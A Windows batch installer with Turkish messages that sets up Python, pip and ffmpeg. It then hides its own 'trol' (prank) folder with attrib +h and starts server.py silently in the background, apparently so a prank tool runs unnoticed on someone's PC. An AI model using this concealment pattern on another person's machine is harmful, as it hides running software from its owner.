@echo off
REM enter.bat - otomatik kurulum + server başlatma
cd /d "%~dp0"
setlocal

echo [enter.bat] starting in %CD%

REM -------- find python ----------
where python >nul 2>&1
if %ERRORLEVEL%==0 (
  set "PYEXE=python"
) else (
  where pythonw >nul 2>&1
  if %ERRORLEVEL%==0 (
    set "PYEXE=pythonw"
  ) else (
    if exist "%~dp0python\python.exe" (
      set "PYEXE=%~dp0python\python.exe"
    ) else (
      echo [enter.bat] Python bulunamadi. Portable Python indirilecek (internet gerekli)...
      powershell -Command "try { Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.6/python-3.11.6-embed-amd64.zip' -OutFile 'python_embed.zip' -UseBasicParsing } catch { exit 1 }"
      if not exist python_embed.zip (
        echo [enter.bat] Python indirme basarisiz. Lutfen manuel Python kurup tekrar deneyin.
        pause
        exit /b 1
      )
      echo [enter.bat] Arşiv açılıyor...
      powershell -Command "Expand-Archive -Path 'python_embed.zip' -DestinationPath 'python' -Force"
      if exist "%~dp0python\python.exe" (
        set "PYEXE=%~dp0python\python.exe"
        echo [enter.bat] pip kurulumu deneniyor...
        "%PYEXE%" -m ensurepip --upgrade >nul 2>&1 || (
          powershell -Command "try { Invoke-WebRequest -Uri 'https://bootstrap.pypa.io/get-pip.py' -OutFile 'get-pip.py' -UseBasicParsing } catch { exit 1 }"
          if exist get-pip.py (
            "%PYEXE%" get-pip.py
          )
        )
      ) else (
        echo [enter.bat] Portable Python acilamadi. Lutfen Python yukleyin.
        pause
        exit /b 1
      )
    )
  )
)

echo [enter.bat] Python kullanici: %PYEXE%

REM -------- create venv ----------
if not exist venv (
  echo [enter.bat] virtualenv olusturuluyor...
  "%PYEXE%" -m venv venv
) else (
  echo [enter.bat] venv zaten var
)

echo [enter.bat] venv aktif ediliyor...
call "%~dp0venv\Scripts\activate.bat"

echo [enter.bat] pip guncelleniyor...
python -m pip install --upgrade pip setuptools wheel

echo [enter.bat] requirements yukleniyor...
pip install -r requirements.txt

REM -------- ffplay / ffprobe kontrolu ----------
if not exist "%~dp0ffplay.exe" (
  echo [enter.bat] ffplay.exe bulunamadi. Otomatik ffmpeg indirilecek (internet gerekli)...
  powershell -Command "try { Invoke-WebRequest -Uri 'https://www.gyan.dev/ffmpeg/builds/ffmpeg-release-essentials.zip' -OutFile 'ffmpeg.zip' -UseBasicParsing } catch { exit 1 }"
  if exist ffmpeg.zip (
    echo [enter.bat] ffmpeg arşivi açılıyor...
    powershell -Command "Expand-Archive -Path 'ffmpeg.zip' -DestinationPath 'ffmpeg_tmp' -Force"
    if exist "ffmpeg_tmp\bin\ffplay.exe" (
      move /Y "ffmpeg_tmp\bin\ffplay.exe" "%~dp0" >nul 2>&1
      move /Y "ffmpeg_tmp\bin\ffprobe.exe" "%~dp0" >nul 2>&1
      rmdir /s /q ffmpeg_tmp
      del /q ffmpeg.zip
      echo [enter.bat] ffplay/ffprobe trol klasorune tasindi.
    ) else (
      echo [enter.bat] ffplay bulunamadi indirmede. Lutfen ffplay.exe & ffprobe.exe dosyalarini trol klasorune koyun.
    )
  ) else (
    echo [enter.bat] ffmpeg indirme basarisiz. Lutfen ffplay.exe & ffprobe.exe'yi elle koyun.
  )
) else (
  echo [enter.bat] ffplay.exe bulundu.
)

REM -------- hide trol folder (set hidden attribute) ----------
echo [enter.bat] trol klasoru gizleniyor (attrib +h)...
attrib +h "%~dp0" 2>nul

REM -------- start server in background (no console) ----------
echo [enter.bat] server arka planda baslatiliyor...
start "" "%~dp0venv\Scripts\pythonw.exe" "%~dp0server.py"

echo [enter.bat] Server baslatildi. Konsolu kapatabilirsiniz.
endlocal
exit /b 0
